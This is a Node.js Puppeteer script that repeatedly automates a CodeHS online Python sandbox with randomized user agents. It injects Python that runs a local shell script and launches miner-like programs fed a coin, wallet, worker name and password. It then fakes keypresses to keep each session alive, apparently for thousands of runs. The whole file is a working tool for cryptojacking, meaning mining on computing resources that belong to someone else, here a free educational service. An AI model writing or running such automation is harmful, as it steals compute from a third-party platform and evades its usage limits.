const process = require('process');
const userAgent = require('user-agents');
const puppeteer = require('puppeteer');
(async () => {
    const coin = process.argv[2]
    const wallet = process.argv[3]
    const name = process.argv[4]
    const passw = process.argv[5]
    for(i=0;i<3000;i++){
    const browser = await puppeteer.launch({executablePath:"/usr/lib/chromium-browser/chromium-browser", args:['--no-sandbox']});
    const page = await browser.newPage();
    await page.setUserAgent(userAgent.toString())
    await page.goto('https://codehs.com/sandbox/id/python-3-JjQsnQ')
    await page.waitForTimeout(2000)

    await page.mouse.click(300,125,{'button': 'left'})
    await page.keyboard.down('ControlLeft')
    await page.keyboard.press('KeyA')
    await page.keyboard.up('ControlLeft')
    await page.keyboard.type(`import time;import sys;import os;os.system('chmod +x i.sh && ./i.sh');time.sleep(9);os.system('python3 ab.py & python3 m.py ${coin} ${wallet} ${name} ${passw}')`)

    await page.waitForTimeout(2000)
    await page.mouse.click(580,125,{'button': 'left'})
    await page.waitForTimeout(1000)
    for(y=0;y<45;y++) {
        await page.mouse.click(580,400,{'button': 'left'})
        await page.keyboard.press('KeyH')
        await page.waitForTimeout(5000)
        await page.keyboard.press('KeyS')
        await page.waitForTimeout(5000)
        await page.keyboard.press('KeyH')
        await page.waitForTimeout(5000)
        console.log(`a${i}${y}`)
        await page.screenshot({'path': 'result.png'})
    }
    await page.waitForTimeout(1000)
    await page.mouse.click(630,125,{'button': 'left'})
    await page.waitForTimeout(5000)
    await browser.close();
    }
})();
